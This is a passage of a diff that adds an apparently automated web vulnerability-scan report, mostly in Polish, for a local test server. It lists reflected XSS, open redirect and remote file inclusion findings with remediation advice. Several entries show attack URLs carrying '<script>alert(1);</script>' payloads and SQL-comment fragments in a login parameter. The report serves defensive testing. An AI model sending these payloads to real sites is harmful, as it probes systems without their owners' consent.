aby zapewnić tę możliwość w każdym punkcie, w kt&oacute;rym generowane są dane wyjściowe.</p><p></p><p>Faza: Implementacja</p><p>Dla każdej wygenerowanej strony internetowej użyj i określ kodowanie znak&oacute;w, takie jak ISO-8859-1 lub UTF-8. Jeśli kodowanie nie jest określone, przeglądarka internetowa może wybrać inne kodowanie, zgadując, kt&oacute;re kodowanie jest faktycznie używane na stronie internetowej. Może to spowodować, że przeglądarka traktuje określone sekwencje jako wyjątkowe, otwierając klienta na subtelne ataki XSS. Zobacz CWE-116, aby dowiedzieć się więcej o ograniczeniach związanych z kodowaniem / ucieczką.</p><p></p><p>Aby zmniejszyć ataki XSS na sesję pliku ciasteczek, ustaw plik sesji ciastecze jako HttpOnly. W przeglądarkach obsługujących funkcję HttpOnly (takich jak nowsze wersje przeglądarki Internet Explorer i Firefox) ten atrybut może uniemożliwić dostęp do pliku sesji ciasteczek użytkownika szkodliwym skryptom po stronie klienta, kt&oacute;re używają document.cookie. Nie jest to całkowite rozwiązanie, ponieważ HttpOnly nie jest obsługiwany przez wszystkie przeglądarki. Co ważniejsze, XMLHTTPRequest i inne zaawansowane technologie przeglądarek zapewniają dostęp do odczytu dla nagł&oacute;wk&oacute;w HTTP, w tym nagł&oacute;wek Set-Cookie, w kt&oacute;rym ustawiona jest flaga HttpOnly.</p><p></p><p>Zakładaj, że wszystkie dane wejściowe są szkodliwe. Używaj strategii sprawdzania danych wejściowych "akceptuj dobrze znane", np. Użyj białej listy dopuszczalnych danych wejściowych ściśle zgodnych ze specyfikacjami. Odrzucaj wszystkie dane wejściowe, kt&oacute;re nie są ściśle dopasowane ze specyfikacjami lub przeobraź je w takie, kt&oacute;re są dopasowane. Nie polegaj wyłącznie na danych wejściowych wyglądających na szkodliwe lub zdeformowane(n.p. nie polegaj na czarnej liście). Niemniej, czarne listy mogą być pomocne w wykryciu potencjalnych atak&oacute;w lub w ustaleniu kt&oacute;re dane wyjściowe są tak zdeformowane, że powinny być kategorycznie odrzucone.</p><p></p><p>Kiedy przeprowadzasz weryfikację danych wejściowych, bierz pod uwagę wszystkie potencjalnie ważne właściwości, włączając długość, pełny zasięg akceptowalnych wartości, brakujących lub dodatkowych danych wejściowych, zgodność poprzez ważne pola i dostosowanie się do zasad sprawy. Jako przykład logiki reguł transakcji, "ł&oacute;dka" może być składniowo prawidłowa, ponieważ zawiera tylko alfanumeryczne znaki, ale nie będzie poprawna jeśli oczekujesz kolor&oacute;w takich jak "czerwony" lub "niebieski".</p><p></p><p></p><p>Upewnij się, że sprawdzanie danych wejściowych odbywa się na dobrze zdefiniowanych interfejsach w aplikacji. Pomoże to chronić aplikację, nawet jeśli komponent zostanie ponownie wykorzystany lub przeniesiony gdzie indziej.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>http://projects.webappsec.org/Cross-Site-Scripting</p><p>http://cwe.mitre.org/data/definitions/79.html</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">79</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">8</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">1</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-high">
+                <th width="20%"><a name="high"></a>High (Low)</th><th width="80%">Cross Site Scripting (Reflected)</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>Cross-site Scripting (XSS) to technika ataku, kt&oacute;ra polega na odbiorze kodu dostarczonego przez osobę atakującą do instancji przeglądarki użytkownika. Przykładem przeglądarki może być standardowy klient przeglądarki internetowej lub wbudowany w oprogramowaniu obiekt wyszukiwarki taki jak przeglądarka w WinAmpie, czytniku RSS lub klient e-maila. Sam kod jest zwykle napisany w HTML/JavaScripcie, ale też rozszerzony o VBScript, ActiveX, Jave, Flasha lub jakąkolwiek inną technologię obsługującą przeglądarki.</p><p>Jeśli haker zdobędzie przeglądarkę użytkownika do wykonywania jego/jej kodu, to kod zostanie uruchomiony w kontekście(lub strefie) bezpieczeństwa hostującej strony internetowej. Z takim poziomem przywileju, kod ma możliwość czytania, modyfikowania i transmitowania jakichkolwiek dostępnych danych poprzez przeglądarkę. Użytkownik używający skrypt&oacute;w krzyżowych może zostać przejęty przez swoje konto (kradzież plik&oacute;w cookie), przeglądarka zostanie przekierowana do innej lokalizacji lub może zostać dostarczona fałszywa zawartość przez odwiedzaną witrynę internetową. Ataki typu "cross-site scripting" zasadniczo naruszają kredyt zaufania między użytkownikiem a witryną internetową. Aplikacje wykorzystujące instancje obiekt&oacute;w przeglądarki, kt&oacute;re ładują zawartość z systemu plik&oacute;w, mogą wykonywać kod zgodnie zlokalną strefą maszyny, co pozwala na naruszenie systemu.</p><p></p><p>Są trzy typy atak&oacute;w Cross-site Scripting: nieustępliwy, ustępliwy i oparty na DOM.</p><p>Ustępliwe ataki i ataki oparte na domenie DOM wymagają od użytkownika odwiedzenia specjalnie zrobionego ręcznie linku ze złośliwym kodem lub odwiedzenia złośliwej strony internetowej zawierającej formularz internetowy, kt&oacute;ry po opublikowaniu w narażonej witrynie spowoduje atak. Używanie złośliwej formy często ma miejsce, gdy narażony na atak zas&oacute;b akceptuje tylko żądania HTTP POST. W takim wypadku, forma może być podporządkowany automatycznie, bez wiedzy ofiary(n.p poprzez użycie JavaScriptu). Po kliknięciu szkodliwego linku lub przesłaniu złośliwego formularza, ładunek XSS zostanie wysłany z powrotem i zostanie zinterpretowany przez przeglądarkę użytkownika i wykonany. Inną techniką do wysyłania niemal bezwzględnych żądań(DOSTAĆ i WYSŁAĆ) jest poprzez użycie wbudowany klient, taki jak Adobe Flash.</p><p>Trwałe ataki pojawiają się kiedy złośliwy kod jest wysyłany do witryny gdzie jest przechowywany przez jakiś okres czasu. Przykłady ulubionych cel&oacute;w haker&oacute;w obejmują posty wiadomości na tablicy, maile i oprogramowanie czatu witryny. Nic nie podejrzewający użytkownik nie musi wchodzić w interakcję z żadną dodatkową witryną / linkiem (np. Stroną atakującą lub złośliwym linkiem wysłanym za pośrednictwem poczty elektronicznej), wystarczy po prostu przejrzeć stronę internetową zawierającą kod.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/users.json?callback=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">callback</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password=%27%2F*&amp;password=*%2F%271&amp;password=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&amp;password=*%2FLIKE%2F*&amp;password=*%2FOR%2F*&amp;username=admin</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">password</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?size=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">size</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">path</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?include=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">include</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">5</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Faza: Architektura i Projektowanie</p><p>Używaj sprawdzonej biblioteki lub struktury, kt&oacute;re nie pozwalają na wystąpienie tego osłabienia lub wprowadzają konstrukcje, kt&oacute;re sprawiają, że to osłabienie jest łatwiejsze do uniknięcia.</p><p>Przykłady bibliotek i szkielet&oacute;w, kt&oacute;re sprawiają, że łatwiej jest generować poprawnie zaszyfrowane dane wyjściowe obejmujące bibliotekę Anti-XSS microsofta, zaszyfrowany moduł ESAPI i Bramkę Apache.</p><p></p><p>Fazy: Implementacja; Architektura i Projektowanie</p><p>Zapoznaj się z kontekstem, w kt&oacute;rym będą używane twoje dane i kodowaniem, jakiego się spodziewasz. Jest to zwłaszcza ważne kiedy dane są transmitowane pomiędzy r&oacute;żnymi komponentami lub kiedy generowane są dane wyjściowe, kt&oacute;re zawierają wielokrotne szyfrowanie w tym samym czasie, tak jak strony internetowe albo kilkuczęściowe wiadomości e-mail. Zbadaj wszystkie przewidywane protokoły komunikacyjne i reprezentacje danych, aby określić wymagane strategie kodowania.</p><p>W przypadku danych, kt&oacute;re będą wysyłane na inną stronę internetową, w szczeg&oacute;lności wszelkie dane otrzymane z zewnętrznych źr&oacute;deł, należy zastosować odpowiednie kodowanie na wszystkich niealfanumerycznych znakach.</p><p>Zapoznaj się z Arkuszem Zapobiegania Oszustwa XSS, aby uzyskać więcej informacji na temat typ&oacute;w kodowania i ucieczki, kt&oacute;re są potrzebne.</p><p></p><p>Faza: Architektura i Projektowanie</p><p>W przypadku wszelkich kontroli bezpieczeństwa przeprowadzanych po stronie klienta należy upewnić się, że kontrole te są duplikowane po stronie serwera, aby uniknąć CWE-602. Hakerzy mogą obejść kontrole po stronie klienta, modyfikując wartości po przeprowadzeniu kontroli lub zmieniając klienta, aby całkowicie usunąć kontrole po stronie klienta. Następnie te zmodyfikowane wartości zostaną przesłane do serwera.</p><p></p><p>Jeśli możliwe, używaj wymodelowane mechanizmy automatycznie wymuszające oddzielenie danych i kodu. Te mechanizmy mogą być w stanie zapewnić odpowiednie cytowanie, kodowanie i sprawdzanie poprawności automatycznie, zamiast polegać na programistach, aby zapewnić tę możliwość w każdym punkcie, w kt&oacute;rym generowane są dane wyjściowe.</p><p></p><p>Faza: Implementacja</p><p>Dla każdej wygenerowanej strony internetowej użyj i określ kodowanie znak&oacute;w, takie jak ISO-8859-1 lub UTF-8. Jeśli kodowanie nie jest określone, przeglądarka internetowa może wybrać inne kodowanie, zgadując, kt&oacute;re kodowanie jest faktycznie używane na stronie internetowej. Może to spowodować, że przeglądarka traktuje określone sekwencje jako wyjątkowe, otwierając klienta na subtelne ataki XSS. Zobacz CWE-116, aby dowiedzieć się więcej o ograniczeniach związanych z kodowaniem / ucieczką.</p><p></p><p>Aby zmniejszyć ataki XSS na sesję pliku ciasteczek, ustaw plik sesji ciastecze jako HttpOnly. W przeglądarkach obsługujących funkcję HttpOnly (takich jak nowsze wersje przeglądarki Internet Explorer i Firefox) ten atrybut może uniemożliwić dostęp do pliku sesji ciasteczek użytkownika szkodliwym skryptom po stronie klienta, kt&oacute;re używają document.cookie. Nie jest to całkowite rozwiązanie, ponieważ HttpOnly nie jest obsługiwany przez wszystkie przeglądarki. Co ważniejsze, XMLHTTPRequest i inne zaawansowane technologie przeglądarek zapewniają dostęp do odczytu dla nagł&oacute;wk&oacute;w HTTP, w tym nagł&oacute;wek Set-Cookie, w kt&oacute;rym ustawiona jest flaga HttpOnly.</p><p></p><p>Zakładaj, że wszystkie dane wejściowe są szkodliwe. Używaj strategii sprawdzania danych wejściowych "akceptuj dobrze znane", np. Użyj białej listy dopuszczalnych danych wejściowych ściśle zgodnych ze specyfikacjami. Odrzucaj wszystkie dane wejściowe, kt&oacute;re nie są ściśle dopasowane ze specyfikacjami lub przeobraź je w takie, kt&oacute;re są dopasowane. Nie polegaj wyłącznie na danych wejściowych wyglądających na szkodliwe lub zdeformowane(n.p. nie polegaj na czarnej liście). Niemniej, czarne listy mogą być pomocne w wykryciu potencjalnych atak&oacute;w lub w ustaleniu kt&oacute;re dane wyjściowe są tak zdeformowane, że powinny być kategorycznie odrzucone.</p><p></p><p>Kiedy przeprowadzasz weryfikację danych wejściowych, bierz pod uwagę wszystkie potencjalnie ważne właściwości, włączając długość, pełny zasięg akceptowalnych wartości, brakujących lub dodatkowych danych wejściowych, zgodność poprzez ważne pola i dostosowanie się do zasad sprawy. Jako przykład logiki reguł transakcji, "ł&oacute;dka" może być składniowo prawidłowa, ponieważ zawiera tylko alfanumeryczne znaki, ale nie będzie poprawna jeśli oczekujesz kolor&oacute;w takich jak "czerwony" lub "niebieski".</p><p></p><p></p><p>Upewnij się, że sprawdzanie danych wejściowych odbywa się na dobrze zdefiniowanych interfejsach w aplikacji. Pomoże to chronić aplikację, nawet jeśli komponent zostanie ponownie wykorzystany lub przeniesiony gdzie indziej.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>Raised with LOW confidence as the Content-Type is not HTML</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>http://projects.webappsec.org/Cross-Site-Scripting</p><p>http://cwe.mitre.org/data/definitions/79.html</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">79</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">8</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">1</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-high">
+                <th width="20%"><a name="high"></a>High (Medium)</th><th width="80%">External Redirect</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>URL redirectors represent common functionality employed by web sites to forward an incoming request to an alternate resource. This can be done for a variety of reasons and is often done to allow resources to be moved within the directory structure and to avoid breaking functionality for users that request the resource at its previous location. URL redirectors may also be used to implement load balancing, leveraging abbreviated URLs or recording outgoing links. It is this last implementation which is often used in phishing attacks as described in the example below. URL redirectors do not necessarily represent a direct security vulnerability but can be abused by attackers trying to social engineer victims into believing that they are navigating to a site other than the true destination.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir=3177284218741671207.owasp.org</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">redir</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">3177284218741671207.owasp.org</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">3177284218741671207.owasp.org</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">1</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Zakładaj, że wszystkie dane wejściowe są szkodliwe. Używaj strategii sprawdzania danych wejściowych "akceptuj dobrze znane", np. Użyj białej listy dopuszczalnych danych wejściowych ściśle zgodnych ze specyfikacjami. Odrzucaj wszystkie dane wejściowe, kt&oacute;re nie są ściśle dopasowane ze specyfikacjami lub przeobraź je w takie, kt&oacute;re są dopasowane. Nie polegaj wyłącznie na danych wejściowych wyglądających na szkodliwe lub zdeformowane(n.p. nie polegaj na czarnej liście). Niemniej, czarne listy mogą być pomocne w wykryciu potencjalnych atak&oacute;w lub w ustaleniu kt&oacute;re dane wyjściowe są tak zdeformowane, że powinny być kategorycznie odrzucone.</p><p></p><p>Kiedy przeprowadzasz weryfikację danych wejściowych, bierz pod uwagę wszystkie potencjalnie ważne właściwości, włączając długość, pełny zasięg akceptowalnych wartości, brakujących lub dodatkowych danych wejściowych, zgodność poprzez ważne pola i dostosowanie się do zasad sprawy. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</p><p></p><p>Use a whitelist of approved URLs or domains to be used for redirection.</p><p></p><p>Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving your site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems when generating the disclaimer page.</p><p></p><p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</p><p></p><p>For example, ID 1 could map to "/login.asp" and ID 2 could map to "http://www.example.com/". Funkcje takie jak ESAPI AccessReferenceMap dają taką możliwość.</p><p></p><p>Fazy: Architektura i Projektowanie; Implementacja</p><p>Zrozum wszystkie potencjalne obszary gdzie niezaufane dane wejściowe wejdą w twoje oprogramowanie: parametry lub argumenty, ciasteczka, jakikolwiek odczyt z sieci, zmiennych środowiskowych, wyszukiwania wstecznego DNS, wyniki zapytania, nagł&oacute;wki żądań, komponenty URL, e-mail, pliki, bazy danych i dowolne zewnętrzne</p><p>systemy, kt&oacute;re dostarczają dane do aplikacji. Pamiętaj o tym, że takie dane wejściowe mogą uzyskane poprzez wezwania API.</p><p></p><p>Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>The response contains a redirect in its meta http-equiv tag for 'Refresh' which allows an external Url to be set.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>http://projects.webappsec.org/URL-Redirector-Abuse</p><p>http://cwe.mitre.org/data/definitions/601.html</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">601</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">38</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">1</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-high">
+                <th width="20%"><a name="high"></a>High (Medium)</th><th width="80%">Remote File Inclusion</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>Zdalne włączanie plik&oacute;w (RFI) jest techniką ataku wykorzystująca mechanizmy "dynamicznego włączania plik&oacute;w" w aplikacjach internetowych. Gdy aplikacje internetowe przejmują dane wprowadzane przez użytkownika (adres URL, wartość parametru itp.) I przekazują je do plik&oacute;w, kt&oacute;re zawierają polecenia, aplikacja internetowa może zostać wykorzystana do dołączenia zdalnych plik&oacute;w za pomocą złośliwego kodu.</p><p></p><p>Prawie wszystkie struktury aplikacji internetowych obsługują inkluzje plik&oacute;w. Inkluzja plik&oacute;w jest gł&oacute;wnie używana do paczkowania zwykłego kodu w oddzielne pliki. kt&oacute;re p&oacute;źniej są odniesione przez gł&oacute;wne moduły aplikacji. Kiedy aplikacja internetowa odwołuje się do dołączonego pliku, kod w tym pliku może być wykonywany bezpośrednio lub pośrednio, wywołując określone procedury. Jeśli wybrany moduł do ładowania jest oparty na elementach z żądania HTTP, aplikacja internetowa może być podatna na RFI.</p><p>Napastnik może użyć RFI dla:</p><p>    * Uruchamiania szkodliwego kodu na serwerze: dowolny kod w załączonych złośliwych plikach będzie uruchamiany przez serwer. Jeśli objęty plik nie jest wykonywany za pomocą jakiejś osłony, kod w objętych plikach jest wykonywany w kontekście użytkownika serwera. Może to prowadzić do całkowitego kompromisu systemowego.</p><p>    * Uruchamianie złośliwego kodu u klient&oacute;w: złośliwy kod hakera może manipulować zawartością odzewu do klienta. Haker może wstawić złośliwy kod w odpowiedź, kt&oacute;ry zostanie uruchomiony przez klienta (na przykład, Javascript do kradzieży sesji cookies klienta).</p><p></p><p>PHP jest szczeg&oacute;lnie podatne na ataki RFI ze względu na szerokie zastosowanie "plik obejmuje" w programowaniu PHP i ze względu na domyślne konfiguracje serwer&oacute;w, kt&oacute;re zwiększają podatność na atak RFI.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=http%3A%2F%2Fwww.google.com%2F</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">path</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">http://www.google.com/</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;title&gt;Google&lt;/title&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">1</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Faza: Architektura i Projektowanie</p><p>Kiedy zbi&oacute;r akceptowalnych obiekt&oacute;w, takich jak nazwy plik&oacute;w lub adresy URL, jest ograniczony lub rozpoznany, utw&oacute;rz odwzorowanie ze zbioru stałych wartości wejściowych (takich jak identyfikatory numeryczne) do rzeczywistych nazw plik&oacute;w lub adres&oacute;w URL i odrzuć wszystkie inne dane wejściowe.</p><p>Na przykład, ID 1 może być wzorowany na "inbox.txt" i ID 2 może być wzorowany na "profile.txt". Funkcje takie jak ESAPI AccessReferenceMap dają taką możliwość.</p><p></p><p>Fazy: Architektura i Projektowanie; Obsługa</p><p>Uruchom sw&oacute;j kod w "więzieniu" lub podobnym testowym środowisku, kt&oacute;re wymusza ścisłe granice między procesem a systemem operacyjnym. Może to skutecznie ograniczyć, kt&oacute;re pliki mogą być dostępne w określonym katalogu lub kt&oacute;re polecenia mogą być wykonywane przez twoje oprogramowanie.</p><p>Przykłady poziomu OS obejmujące Unix chroot jail, AppArmor, and SELinux. Na zasadach og&oacute;lnych, zarządzany kod może zapewnić pewną ochronę. Na przykład,, java.io.FilePermission w Menadżerze Ochrony Javy umożliwia ci sprecyzować ograniczenia odnośnie operacji na plikach.</p><p>To może nie być wykonalne rozwiązanie i ogranicza wpływ tylko na system operacyjny; reszta aplikacji może wciąż być podatna na zagrożenie.</p><p>Zachowaj ostrożność przy omijaniu CWE-243 i innych słabości powiązanych z więzieniami.</p><p>Dla PHP, interpreter oferuje ograniczenia takie jak otwarty katalog bazowy lub bezpieczny tryb kt&oacute;ry może utrudnić hakerowi wydostać się z aplikacji. Weźmy pod uwagę także Suhosin, zahartowane rozszerzenie PHP, kt&oacute;re wprowadza r&oacute;żne opcje, kt&oacute;re blokują niekt&oacute;re z bardziej niebezpiecznych funkcji PHP.</p><p></p><p>Faza: Implementacja</p><p>Zakładaj, że wszystkie dane wejściowe są szkodliwe. Używaj strategii sprawdzania danych wejściowych "akceptuj dobrze znane", np. Użyj białej listy dopuszczalnych danych wejściowych ściśle zgodnych ze specyfikacjami. Odrzucaj wszystkie dane wejściowe, kt&oacute;re nie są ściśle dopasowane ze specyfikacjami lub przeobraź je w takie, kt&oacute;re są dopasowane. Nie polegaj wyłącznie na danych wejściowych wyglądających na szkodliwe lub zdeformowane(n.p. nie polegaj na czarnej liście). Niemniej, czarne listy mogą być pomocne w wykryciu potencjalnych atak&oacute;w lub w ustaleniu kt&oacute;re dane wyjściowe są tak zdeformowane, że powinny być kategorycznie odrzucone.</p><p>Kiedy przeprowadzasz weryfikację danych wejściowych, bierz pod uwagę wszystkie potencjalnie ważne właściwości, włączając długość, pełny zasięg akceptowalnych wartości, brakujących lub dodatkowych danych wejściowych, zgodność poprzez ważne pola i dostosowanie się do zasad sprawy. Jako przykład logiki reguł transakcji, "ł&oacute;dka" może być składniowo prawidłowa, ponieważ zawiera tylko alfanumeryczne znaki, ale nie będzie poprawna jeśli oczekujesz kolor&oacute;w takich jak "czerwony" lub "niebieski".</p><p>Dla nazw plik&oacute;w używaj białe listy, kt&oacute;re ograniczają zbi&oacute;r znak&oacute;w do użycia. Jeśli to możliwe, zezw&oacute;l tylko na pojedynczy "." znak w nazwie pliku, aby uniknąć słabości, takich jak CWE-23, i wykluczyć separatory katalog&oacute;w, takie jak "/", aby uniknąć CWE-36. Używaj białej listy dozwolonych rozszerzeń plik&oacute;w, kt&oacute;re pomogą ominąć CWE-434.</p><p></p><p>Fazy: Architektura i Projektowanie; Obsługa</p><p>Jeśli to możliwe, przechowuj biblioteki, pliki dodatkowe i pliki użytkowe poza gł&oacute;wnym katalogiem dokument&oacute;w internetowych. W przeciwnym razie przechowuj je w oddzielnym katalogu i użyj funkcji kontroli dostępu serwera internetowego, aby uniemożliwić atakującym bezpośrednie żądanie ich. Jedną z powszechnych praktyk jest zdefiniowanie zdeterminowanej stałej w każdym programie wywołującym, a następnie sprawdzenie istnienia stałej w bibliotece/objętym pliku; jeśli stała nie istnieje, to plik został zażądany bezpośrednio i może natychmiast wyjść.</p><p>To znacznie redukuje szanse hakera, kt&oacute;ry może obejść każde mechanizmy obronne, kt&oacute;re są w podstawie programu, ale nie w aktach. To także zredukuje tw&oacute;j powierzchniowy atak.</p><p></p><p>Fazy: Architektura i Projektowanie; Implementacja</p><p>Zrozum wszystkie potencjalne obszary gdzie niezaufane dane wejściowe wejdą w twoje oprogramowanie: parametry lub argumenty, ciasteczka, jakikolwiek odczyt z sieci, zmiennych środowiskowych, wyszukiwania wstecznego DNS, wyniki zapytania, nagł&oacute;wki żądań, komponenty URL, e-mail, pliki, bazy danych i dowolne zewnętrzne</p><p>systemy, kt&oacute;re dostarczają dane do aplikacji. Pamiętaj o tym, że takie dane wejściowe mogą uzyskane poprzez wezwania API.</p><p>Wiele problem&oacute;w inkluzji plik&oacute;w pojawiają się, ponieważ programista zakłada, że niekt&oacute;re dane wejściowe nie mogą być modyfikowane, a zwłaszcza dla ciasteczek i komponent&oacute;w URL.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
